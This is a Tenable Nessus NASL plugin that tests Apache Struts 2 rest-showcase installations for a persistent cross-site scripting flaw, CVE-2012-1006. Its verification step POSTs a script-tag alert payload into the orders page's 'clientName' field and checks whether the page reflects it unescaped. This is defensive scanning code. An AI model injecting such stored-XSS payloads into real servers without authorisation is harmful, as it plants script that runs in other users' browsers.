#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(60095);
  script_version("1.10");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2012-1006");
  script_bugtraq_id(51902);
  script_xref(name:"EDB-ID", value:"18452");

  script_name(english:"Apache Struts 2 struts2-rest-showcase orders 'clientName' Parameter Persistent XSS");

  script_set_attribute(attribute:"synopsis", value:
"A remote web application is affected by a persistent cross-site
scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web server hosts Struts2-rest-showcase, a demonstration
application for the Struts 2 framework. Input passed via the
'clientName' parameter to the orders page is not properly sanitized,
which can allow for arbitrary HTML and script code to be loaded onto
the system and executed when a user visits the orders page.");
  script_set_attribute(attribute:"see_also", value:"http://secpod.org/blog/?p=450");
  # http://secpod.org/advisories/SecPod_Apache_Struts_Multiple_Parsistant_XSS_Vulns.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d16eaf1b");
  script_set_attribute(attribute:"solution", value:
"Remove or restrict access to the Struts2-rest-showcase application.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/02/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/07/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2012-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:8080);

# Loop through directories.
dirs = list_uniq(make_list("/struts-rest-showcase", "/struts2-rest-showcase", cgi_dirs()));
if (thorough_tests) 
{
  struts_2x_versions = make_list(
    "2.3.4","2.3.3","2.3.1.2","2.3.1.1","2.3.1",
    "2.2.3.1","2.2.3","2.2.1.1","2.2.1","2.1.8.1",
    "2.1.8","2.1.6","2.0.14","2.0.12","2.0.11.2",
    "2.0.11.1","2.0.11","2.0.9","2.0.8","2.0.6"
  );

  foreach ver (struts_2x_versions)
    dirs = list_uniq(make_list(dirs, "/struts2-rest-showcase-"+ver, "/struts-rest-showcase-"+ver));
}

xss_string = "<script>alert('" + SCRIPT_NAME + '_' + rand_str() + "');</script>";

attack_page = "/orders";
verify_page = "/orders";

report_pages = make_list();
foreach dir (dirs)
{
  verify_url = dir + verify_page;
  res = http_send_recv3(method:"GET", 
                        port:port, 
                        item:verify_url, 
                        exit_on_fail:TRUE);

  if (
    "<title>Orders</title>" >< res[2] && 
    'href="orders/new">Create a new order</a>' >< res[2]
  )
  {
    postdata =
      "clientName=" + xss_string + "&" +
      "amount=0"; 
    attack_url = dir + attack_page;

    headers = make_array("Content-Type", "application/x-www-form-urlencoded");

    res = http_send_recv3(method:"POST", 
                    port:port, 
                    item:attack_url, 
                    add_headers:headers,
                    data:postdata, 
                    exit_on_fail:TRUE);
  
    # have to check person list page to verify exploit worked  
    res = http_send_recv3(method:"GET", 
                          port:port, 
                          item:verify_url, 
                          exit_on_fail:TRUE);

    if ('>' + xss_string + '<' >< res[2])
    {
      report_pages = make_list(report_pages, build_url(port:port, qs:verify_url));
      output = strstr(res[2], xss_string);
      if (!thorough_tests) break;
    } 
  }
}

if (max_index(report_pages) > 0)
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_WARNING,
    generic    : TRUE,
    line_limit : 5,
    xss        : TRUE,  # Sets XSS KB key
    request    : report_pages,
    output     : chomp(output)
  );
  exit(0);
}
else exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');
